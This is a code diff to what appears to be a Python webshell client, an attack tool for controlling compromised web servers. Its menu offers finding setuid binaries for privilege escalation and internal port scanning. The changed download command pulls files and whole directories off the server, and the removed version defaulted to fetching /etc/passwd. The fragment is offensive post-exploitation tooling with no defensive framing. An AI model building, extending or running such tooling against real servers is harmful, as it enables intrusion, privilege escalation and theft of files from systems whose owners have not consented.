@@ -36,9 +36,9 @@ def main_help():
     print "        10. [fwpf] : find writable php file"
     print "        11. [gdf] : get disabled function"
     print "        12. [ps] : port scan"
-    print "        13. [fsb] : find setuid binaries"
-    print "        13. [dl] : download file"
-    print "        14. [q|quit|exit] : quit"
+    print "        14. [fsb] : find setuid binaries"
+    print "        15. [dl] : download file"
+    print "        16. [q|quit|exit] : quit"
 
 def main():
     banner()
@@ -87,10 +87,19 @@ def main():
         elif context == "fsb":
             webshell.get_suid_binaries()
         elif context == "dl":
-            path = raw_input("Input path (/etc/passwd) : ") or ("/etc/passwd")
-            filename = path.split("/")[-1]
-            local_path = raw_input("Input local path (%s) : " % filename) or (filename)
-            webshell.download(path, local_path)
+            path = raw_input("Input path (%s) : " % webshell.webroot) or (webshell.webroot)
+            if not webshell.file_exists(path):
+                Log.error("The file [%s] is not exists on the server!" % (path))
+                continue
+            if webshell.is_directory(path):
+                Log.info("The target file is a directory, using recursion download...")
+                webshell.download_recursion(path)
+            else:
+                filename = path.split("/")[-1]
+                local_path = raw_input("Input local path (%s) to save the file : " % filename) or (filename)
+                Log.info("Using root path : [%s] to save!" % (local_path))
+                Log.info("The target file is a single file, starting download...")
+                webshell.download(path, local_path)
         elif context == "ps":
             hosts = raw_input("Input hosts (192.168.1.1/24) : ") or "192.168.1.1/24"
             if not "/" in hosts:
